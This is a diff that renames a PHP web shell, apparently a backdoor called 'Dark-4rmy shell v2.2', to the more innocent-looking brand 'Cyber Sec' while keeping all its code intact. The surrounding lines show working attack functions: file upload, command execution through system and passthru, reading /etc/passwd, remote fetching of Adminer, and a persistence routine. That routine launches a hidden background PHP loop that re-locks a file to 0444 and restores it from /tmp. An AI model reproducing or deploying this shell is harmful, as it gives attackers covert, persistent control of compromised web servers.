@@ -3,7 +3,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dark-4rmy</title>
+    <title>Cyber Sec</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="author" content="Общий">
@@ -219,7 +219,7 @@ select:after {
       width: 100px;
       height: 100px;
 }
-.darkarmy-text {
+.cybersec-text {
     font-size: 19pt;
     font-family: "Carrois Gothic", cursive;
     color: #fff;
@@ -269,7 +269,7 @@ if (empty($disfunc)) {
     $disf = "<font color='red'>".$disfunc."</font>";
 }
 function author() {
-    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2025 &copy; Общий | Dark-4my</center></td></table><br>";
+    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2025 &copy; Общий | Cyber Sec</center></td></table><br>";
     exit();
 }
 
@@ -293,7 +293,7 @@ function cekroot() {
         return "<font color='red'>KONTOL!</font>";
     }
 }
-function darkarmy_ex($file) {
+function cybersec_ex($file) {
     $pile = $file;
     $pch = pathinfo($pile, PATHINFO_FILENAME);
     return $pch;
@@ -316,9 +316,9 @@ function xrmdir($dir) {
 }
 function net($hexnet) {
             for ($i = 0; $i < strlen($hexnet); $i++) {
-                $darkarmy .= dechex(ord($hexnet[$i]));
+                $cybersec .= dechex(ord($hexnet[$i]));
             }
-            return $darkarmy;
+            return $cybersec;
         }
 function owner($file) {
     if (function_exists("posix_getpwuid")) {
@@ -488,7 +488,7 @@ $serlokbos = @scandir($serlok);
 
 
 echo '<table class="header"><td><center>
-    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> GENERAL</a></center></div></td><td>';
+    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> Cyber Sec</a></center></div></td><td>';
 echo '<table align="center"><td>
 <div class="btn-group me-2" role="group" aria-label="First group">
 <button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
@@ -709,7 +709,7 @@ if (isset($_GET['viewfile'])) {
     echo "<table class='directory-listing-table'><td><center>
     <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>
     <div class='input-group' style='width:360px;'>
-    <input type='file' name='desan' id='darkarmy' style='background-color: grey;' class='form-control' name='uplod'>
+    <input type='file' name='desan' id='cybersec' style='background-color: grey;' class='form-control' name='uplod'>
     <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
               </form></center></td></table>";
      if (isset($_POST['uplod'])) {
@@ -760,10 +760,10 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 } elseif ($_REQUEST[net('about')] == "opet") {
     echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
     <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Priv shell uwu edition</div><hr>
-    <br> - Dark-4rmy shell v2.2 <br> - Created by Общий</td></thead></table>"; exit();
+    <br> - Cyber Sec shell v2.2 <br> - Created by Общий</td></thead></table>"; exit();
 } elseif ($_REQUEST[net('lokfile')] == "opet") {
     echo "<table class='directory-listing-table'><td>
-    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='darkarmy-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
+    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='cybersec-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
     <center><form method='post'>
     <div class='input-group' style='width:300px;'>
     <span class='input-group-text mb-2'>Filename :</span>
@@ -776,26 +776,26 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
         } else {
         $filez = $_POST['pile'];
         $tempe = "/tmp";
-        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xdarkarmy').darkarmy_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.darkarmy_ex($filez).'-xopet')) {
-            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').darkarmy_ex($filez).'xdarkarmy.Lock', $serlok);
-            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xdarkarmy').darkarmy_ex($filez).'xhand.Lock', $serlok);
+        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.cybersec_ex($filez).'-xopet')) {
+            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock', $serlok);
+            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'xhand.Lock', $serlok);
             }
-            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').darkarmy_ex($filez).'xdarkarmy.Lock', $serlok);
+            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock', $serlok);
             @chmod($filez, 0444);
             $content = '<?php
     $tmp = "/tmp";
-    $fileperm = darkarmy_perm("'.$filez.'");
-    darkarmy_cmd("chmod 444 '.$filez.'");
+    $fileperm = cybersec_perm("'.$filez.'");
+    cybersec_cmd("chmod 444 '.$filez.'");
     while (True) {
         if (!file_exists("'.$filez.'")) {
-            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').darkarmy_ex($filez).'xdarkarmy.Lock"));
+            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock"));
             FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var));
         }
         if ($fileperm != "0444"){
-            darkarmy_cmd("chmod 444 '.$filez.'");
+            cybersec_cmd("chmod 444 '.$filez.'");
         }
     }
-    function darkarmy_cmd($value)
+    function cybersec_cmd($value)
     {
         if (function_exists("system")) {
             sYsTem($value);
@@ -807,13 +807,13 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
             return pAsSThRu($value);
         }
     }
-    function darkarmy_perm($filez){
+    function cybersec_perm($filez){
         return substr(sprintf("%o", fileperms($filez)), -4);
     }';
-    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xdarkarmy'). darkarmy_ex($filez).'xhand.Lock', $content);
+    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xcybersec'). cybersec_ex($filez).'xhand.Lock', $content);
     if ($content) {
         echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
-        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xdarkarmy').darkarmy_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
+        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
     } else {
         echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't lock $filez</font></td></table>";
             }
@@ -871,7 +871,7 @@ $uSr=file("/etc/passwd");
 foreach($uSr as $usrr) { 
 $str=explode(":",$usrr); echo $str[0]."\n"; } 
 echo'</textarea><br>
-<input type="hidden" class="input" name="folfig" value="darkarmycfg"/><br>
+<input type="hidden" class="input" name="folfig" value="cyberseccfg"/><br>
 <select class="form-select form-select-sm" aria-label=".form-select-lg example" style="width:150px;">
 <option>select menu</option>
 <option title="type txt" value=".txt">.txt</option>
@@ -1050,15 +1050,15 @@ echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
     }exit();
 } elseif ($_REQUEST[net('ner')] == "opet") {
     function crot($url){
-        $darkarmy = curl_init($url);
-        curl_setopt($darkarmy, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($darkarmy, CURLOPT_CONNECTTIMEOUT, 10);
-        curl_setopt($darkarmy, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($darkarmy, CURLOPT_HEADER, 0);
-        return curl_exec($darkarmy);
-        curl_close($darkarmy);
+        $cybersec = curl_init($url);
+        curl_setopt($cybersec, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($cybersec, CURLOPT_CONNECTTIMEOUT, 10);
+        curl_setopt($cybersec, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($cybersec, CURLOPT_HEADER, 0);
+        return curl_exec($cybersec);
+        curl_close($cybersec);
     } 
-        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='darkarmy-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
+        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='cybersec-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
     <form method='POST'>
     <div class='input-group' style='width:300px;'>
     <span class='input-group-text mb-2'>Filename :</span>
@@ -1112,8 +1112,8 @@ echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
         echo '<table class="directory-listing-table" style="border-color:orange;"><td><font color="orange">Folder field is required</font> [<a href="?path='.$_GET['path'].'&'.net("buatfolder").'=opet"><i class="fa-solid fa-folder-plus" aria-hidden="true"></i>Create again</a>]</td></table>';
         } else {
         $add = $_POST["add"];
-        $darkarmy = mkdir($_GET['path']."/".$add);
-        if ($darkarmy == true) {
+        $cybersec = mkdir($_GET['path']."/".$add);
+        if ($cybersec == true) {
             echo "<table class='directory-listing-table' style='border-color:lime;'><td>Created =><font color=lime> ".$_GET['path']."/</font><font color='orange'>$add</font><br>
             <a href='?path=".$_GET['path']."/$add'><u>Click Here</u></a></td></table>";
     } else {
@@ -1217,10 +1217,10 @@ if(is_readable($serlok)){
                 if($fols=='.'||$fols=='..'){
                     continue;
                 }
-                    $darkarmys=$serlok.'/'.$fols;
-                    if(is_dir($darkarmys)){
+                    $cybersecs=$serlok.'/'.$fols;
+                    if(is_dir($cybersecs)){
                         array_push($serlokbos,$fols);
-                    }elseif(is_file($darkarmys)){
+                    }elseif(is_file($cybersecs)){
                         array_push($filez,$fols);
                     }
                 }
